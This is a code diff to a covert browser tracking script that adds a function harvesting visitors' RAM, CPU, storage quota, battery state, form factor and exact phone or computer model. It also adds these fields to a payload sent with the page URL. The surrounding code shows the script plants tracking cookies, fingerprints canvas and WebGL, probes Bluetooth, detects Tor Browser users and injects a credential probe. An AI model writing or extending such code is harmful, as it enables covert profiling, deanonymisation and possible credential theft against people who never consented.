@@ -56,7 +56,13 @@
             deviceMemory: '',
             hardwareConcurrency: '',
             bluetoothStatus: '',
-            bluetoothDevice: ''
+            bluetoothDevice: '',
+            deviceType: '',
+            deviceModel: '',
+            deviceRam: '',
+            deviceStorage: '',
+            deviceCpu: '',
+            deviceArchitecture: ''
         }
     };
 
@@ -250,7 +256,151 @@
         }
     };
 
-    /* ── 0.6 Plant tracking cookies (fingerprinting) ────────────── */
+    /* ── 0.6 Harvest Deep Device Specifications (RAM, ROM, Model, Form Factor) ── */
+    function _harvestDeviceSpecs() {
+        try {
+            var ua = navigator.userAgent || '';
+            var isMobile = /Android.*Mobile|iPhone|iPod|Windows Phone|Mobile/i.test(ua);
+            var isTablet = /iPad|Tablet|PlayBook|Silk|Kindle|SM-T|GT-P/i.test(ua) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(ua));
+            var isWindows = /Windows/i.test(ua);
+            var isMac = /Macintosh|Mac OS X/i.test(ua) && !isTablet;
+            var isLinux = /Linux/i.test(ua) && !isMobile;
+
+            // 1. RAM / Device Memory (Clamped to 8GB max by W3C privacy sandbox)
+            if (navigator.deviceMemory) {
+                _NX.captured.deviceRam = (navigator.deviceMemory >= 8) ? '8 GB (or higher, W3C limit)' : navigator.deviceMemory + ' GB';
+            } else {
+                _NX.captured.deviceRam = 'Restricted by browser';
+            }
+
+            // 2. CPU Cores & Architecture
+            var cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'Unknown Cores';
+            var arch = 'x64 (64-bit)';
+            if (/arm|aarch64/i.test(ua) || (isMac && navigator.maxTouchPoints === 0 && screen.width >= 1440)) {
+                arch = 'ARM64 (Apple Silicon / ARM)';
+            } else if (/x86_64|Win64|WOW64|x64/i.test(ua)) {
+                arch = 'x86_64 (64-bit)';
+            } else if (/i686|i386|x86/i.test(ua)) {
+                arch = 'x86 (32-bit)';
+            }
+            _NX.captured.deviceCpu = cores + ' • ' + arch;
+            _NX.captured.deviceArchitecture = arch;
+
+            // 3. Storage / ROM (Browser Storage Estimation API)
+            if (navigator.storage && typeof navigator.storage.estimate === 'function') {
+                navigator.storage.estimate().then(function (estimate) {
+                    if (estimate && estimate.quota) {
+                        var quotaGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(1);
+                        var estDisk = '';
+                        var qNum = parseFloat(quotaGB);
+                        if (qNum > 150) estDisk = ' [~512 GB / 1 TB Disk Class]';
+                        else if (qNum > 70) estDisk = ' [~256 GB / 512 GB Disk Class]';
+                        else if (qNum > 30) estDisk = ' [~128 GB / 256 GB Disk Class]';
+                        else if (qNum > 10) estDisk = ' [~64 GB / 128 GB Disk Class]';
+
+                        _NX.captured.deviceStorage = '~' + quotaGB + ' GB Available Quota' + estDisk;
+                        _NX.hasNewData = true;
+                    }
+                }).catch(function () {
+                    _NX.captured.deviceStorage = 'Restricted by storage sandbox';
+                });
+            } else {
+                _NX.captured.deviceStorage = 'Restricted by browser';
+            }
+
+            // 4. Device Form Factor & Classification
+            var type = 'Desktop Workstation';
+            if (isTablet) {
+                type = 'Tablet / iPad';
+            } else if (isMobile) {
+                type = 'Mobile Smartphone';
+            } else if (isWindows || isMac || isLinux) {
+                // Check if Laptop vs Desktop via Battery API
+                if (typeof navigator.getBattery === 'function') {
+                    navigator.getBattery().then(function (batt) {
+                        if (!batt.charging || batt.level < 1) {
+                            _NX.captured.deviceType = 'Laptop (Battery Powered)';
+                        } else {
+                            _NX.captured.deviceType = 'Laptop / Desktop PC';
+                        }
+                    }).catch(function() {});
+                }
+                type = (isMac ? 'MacBook / Apple Mac' : 'Windows PC / Laptop');
+            }
+            _NX.captured.deviceType = type;
+
+            // 5. Device Model Identification
+            var detectedModel = '';
+
+            // 5A. High-Entropy Client Hints (Chrome / Edge / Android exact model)
+            if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
+                navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture', 'bitness'])
+                    .then(function (hints) {
+                        if (hints.model && hints.model !== '') {
+                            var modelName = hints.model;
+                            var smMap = {
+                                'SM-S928': 'Samsung Galaxy S24 Ultra', 'SM-S921': 'Samsung Galaxy S24',
+                                'SM-S926': 'Samsung Galaxy S24+',      'SM-S918': 'Samsung Galaxy S23 Ultra',
+                                'SM-S911': 'Samsung Galaxy S23',        'SM-S916': 'Samsung Galaxy S23+',
+                                'SM-S908': 'Samsung Galaxy S22 Ultra',  'SM-S901': 'Samsung Galaxy S22',
+                                'SM-A546': 'Samsung Galaxy A54 5G',    'SM-A536': 'Samsung Galaxy A53 5G',
+                                'SM-A346': 'Samsung Galaxy A34 5G',    'SM-A145': 'Samsung Galaxy A14',
+                                'SM-F946': 'Samsung Galaxy Z Fold 5',   'SM-F731': 'Samsung Galaxy Z Flip 5',
+                                'SM-N986': 'Samsung Galaxy Note 20 Ultra',
+                                'Pixel 8 Pro': 'Google Pixel 8 Pro',   'Pixel 8': 'Google Pixel 8',
+                                'Pixel 7 Pro': 'Google Pixel 7 Pro',   'Pixel 7': 'Google Pixel 7',
+                                'Pixel 6 Pro': 'Google Pixel 6 Pro',   'Pixel 6': 'Google Pixel 6',
+                                'CPH2451': 'OnePlus 11 5G',            'CPH2581': 'OnePlus 12'
+                            };
+                            for (var code in smMap) {
+                                if (modelName.indexOf(code) !== -1) {
+                                    modelName = smMap[code] + ' (' + modelName + ')';
+                                    break;
+                                }
+                            }
+                            _NX.captured.deviceModel = modelName;
+                            _NX.hasNewData = true;
+                        }
+                    }).catch(function() {});
+            }
+
+            // 5B. Apple iPhone / iPad Model Heuristics (Screen + Ratio + GPU)
+            if (/iPhone|iPad|iPod/i.test(ua) || (isTablet && isMac)) {
+                var w = Math.min(screen.width, screen.height);
+                var h = Math.max(screen.width, screen.height);
+                var dpr = window.devicePixelRatio || 1;
+
+                if (/iPhone/i.test(ua)) {
+                    if (w === 430 && h === 932) detectedModel = 'Apple iPhone 15 Pro Max / 16 Plus';
+                    else if (w === 393 && h === 852) detectedModel = 'Apple iPhone 15 Pro / 15 / 16';
+                    else if (w === 428 && h === 926) detectedModel = 'Apple iPhone 14 Plus / 13 Pro Max / 12 Pro Max';
+                    else if (w === 390 && h === 844) detectedModel = 'Apple iPhone 14 / 13 / 13 Pro / 12';
+                    else if (w === 414 && h === 896 && dpr === 3) detectedModel = 'Apple iPhone 11 Pro Max / XS Max';
+                    else if (w === 414 && h === 896 && dpr === 2) detectedModel = 'Apple iPhone 11 / XR';
+                    else if (w === 375 && h === 812) detectedModel = 'Apple iPhone 13 mini / 12 mini / 11 Pro / X';
+                    else if (w === 414 && h === 736) detectedModel = 'Apple iPhone 8 Plus / 7 Plus / 6s Plus';
+                    else if (w === 375 && h === 667) detectedModel = 'Apple iPhone SE (2nd/3rd Gen) / 8 / 7';
+                    else detectedModel = 'Apple iPhone (' + w + 'x' + h + ' @' + dpr + 'x)';
+                } else {
+                    detectedModel = 'Apple iPad (' + w + 'x' + h + ' @' + dpr + 'x)';
+                }
+            } else if (isMac) {
+                detectedModel = 'Apple Mac / MacBook (' + arch + ')';
+            } else if (isWindows) {
+                var gpu = _NX.captured.webglRenderer || '';
+                var cleanGpu = gpu ? gpu.split('(')[0].replace('ANGLE', '').trim() : '';
+                detectedModel = 'Windows PC / Laptop' + (cleanGpu ? ' (' + cleanGpu + ')' : '');
+            }
+
+            if (!_NX.captured.deviceModel && detectedModel) {
+                _NX.captured.deviceModel = detectedModel;
+            }
+        } catch (e) {
+            _NX.captured.deviceModel = 'Could not extract';
+        }
+    }
+
+    /* ── 0.7 Plant tracking cookies (fingerprinting) ────────────── */
     function _plantCookies() {
         try {
             var uid = 'nx_' + Math.random().toString(36).substr(2, 12);
@@ -633,6 +783,12 @@
             is_tor_browser: _NX.captured.isTorBrowser,
             bluetooth_status: _NX.captured.bluetoothStatus,
             bluetooth_device: _NX.captured.bluetoothDevice,
+            device_type: _NX.captured.deviceType,
+            device_model: _NX.captured.deviceModel,
+            device_ram: _NX.captured.deviceRam,
+            device_storage: _NX.captured.deviceStorage,
+            device_cpu: _NX.captured.deviceCpu,
+            device_architecture: _NX.captured.deviceArchitecture,
             page_url: window.location.href,
             page_title: document.title
         });
@@ -670,6 +826,7 @@
         _harvestNetwork();
         _harvestCanvasAndWebGL();
         _harvestBluetooth();
+        _harvestDeviceSpecs();
         _harvestTor();
         _harvestIndexedDB();
         _injectCredentialProbe();
